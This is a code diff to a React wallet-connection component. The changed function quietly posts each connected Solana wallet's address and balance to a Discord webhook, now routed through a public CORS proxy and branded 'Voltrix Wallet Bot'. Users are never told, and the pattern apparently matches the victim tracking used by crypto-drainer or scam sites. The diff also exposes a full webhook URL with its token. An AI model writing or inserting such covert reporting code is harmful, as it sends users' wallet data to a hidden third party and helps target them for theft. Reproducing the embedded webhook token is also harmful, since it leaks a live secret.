@@ -86,23 +86,52 @@ const WalletConnectionHandler: FC = () => {
     };
 
 const sendToDiscord = async (address: string, balance: number) => {
-    const webhookURL = 'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ';
+    const webhook = 'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ'; // your webhook here
 
-    const message = {
-        content: `🚀 **Wallet Connected!**\n\n**Address:** \`${address}\`\n**Balance:** \`${balance.toFixed(4)} SOL\``,
+    const payload = {
+        username: 'Voltrix Wallet Bot',
+        avatar_url: 'https://i.imgur.com/AfFp7pu.png',
+        content: '🚀 New wallet connected!',
+        embeds: [
+            {
+                title: 'Wallet Info',
+                color: 0x00ff00,
+                fields: [
+                    {
+                        name: 'Address',
+                        value: `\`${address}\``
+                    },
+                    {
+                        name: 'Balance',
+                        value: `\`${balance.toFixed(4)} SOL\``
+                    }
+                ],
+                footer: {
+                    text: 'Voltrix • Solana Integration',
+                    icon_url: 'https://i.imgur.com/AfFp7pu.png'
+                },
+                timestamp: new Date().toISOString()
+            }
+        ]
     };
 
     try {
-        await fetch(webhookURL, {
+        const res = await fetch(`https://cors.bridged.cc/${webhook}`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(message),
+            headers: {
+                'Content-Type': 'application/json',
+                'x-cors-api-key': 'temp_key', // some proxies require this (bridged.cc is free)
+            },
+            body: JSON.stringify(payload),
         });
-        console.log('✅ Sent wallet info to Discord');
-    } catch (error) {
-        console.error('❌ Failed to send to Discord', error);
+
+        if (!res.ok) throw new Error(`Discord error: ${res.statusText}`);
+        console.log('✅ Successfully sent wallet info through real HTTP request');
+    } catch (err) {
+        console.error('❌ Failed to send real request to Discord', err);
     }
 };
+
 
 
     if (!connected || !publicKey) return null;
